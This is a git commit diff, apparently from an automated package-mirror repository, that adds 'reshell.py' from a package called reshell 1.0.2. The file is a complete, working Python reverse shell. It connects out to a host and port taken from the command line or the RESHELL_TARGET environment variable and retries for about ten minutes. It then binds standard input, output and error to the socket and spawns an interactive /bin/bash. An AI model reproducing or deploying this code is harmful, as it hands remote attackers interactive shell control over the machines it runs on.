e3ffbfa9819f8418a78024f0059bf7bf7f3928f6
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-05 16:28:52 +0000

    Add package reshell/1.0.2/reshell-1.0.2.tar.gz

---
+++ packages/reshell/reshell-1.0.2.tar.gz/reshell-1.0.2/reshell.py
@@ -0,0 +1,39 @@
+#!/usr/bin/python
+
+import os
+import sys
+import pty
+import time
+import socket
+
+
+__version__ = '1.0.2'
+
+
+def connect_to_target():
+    if len(sys.argv) == 2:
+        target = sys.argv[1]
+    else:
+        target = os.environ["RESHELL_TARGET"]
+    host, port = target.split(':')
+    port = int(port)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    for minute in range(10):
+        for second in range(0, 60, 10):
+            try:
+                sock.connect((host, port))
+                return sock
+            except socket.error:
+                time.sleep(10)
+
+
+def main():
+    sock = connect_to_target()
+    if sock:
+        for channel in (0, 1, 2):
+            os.dup2(sock.fileno(), channel)
+        pty.spawn("/bin/bash")
+
+
+if __name__ == '__main__':
+    main()
